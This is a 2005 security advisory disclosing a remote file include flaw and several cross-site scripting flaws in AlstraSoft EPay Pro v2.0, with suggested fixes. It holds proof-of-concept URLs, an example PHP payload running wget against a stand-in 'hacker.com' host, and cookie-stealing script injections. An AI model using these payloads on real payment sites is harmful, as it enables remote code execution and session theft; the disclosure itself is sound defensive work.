[dP Security] http://digitalparadox.org/

Severity: High
Title: AlstraSoft EPay Pro v2.0 has file include and multiple xss vulnerabilities
Date: 02/04/2005

Vendor: AlstraSoft
Vendor Website: http://www.alstrasoft.com
Summary: Alstrasoft epay pro v2. has file include and multiple xss vulnerabilities.

Proof of Concept Exploits: 

http://localhost/epal/index.php?view=http://www.whatismyip.com?
File include vulnerability

Instead of www.whatismyip.com if we replaced that with suppose evil.php on www.server.com which contained evil code such as
<?
system('wget http://www.hacker.com");
?>
and we ran, http://localhost/epal/index.php?view=http://www.server.com/evil it would execute the command and thus this can lead to arbitary command execution.


http://localhost/epal/?order_num=crap&payment=">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&send=first&send=regular&send=priority&send=express
Pops cookie


http://localhost/epal/?order_num=crap&payment=crap&send=first&send=regular&send=priority&send='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
Pops cookie


Possible Fixes: The usage of htmlspeacialchars(), and using a base directory for file include would solve these problems.
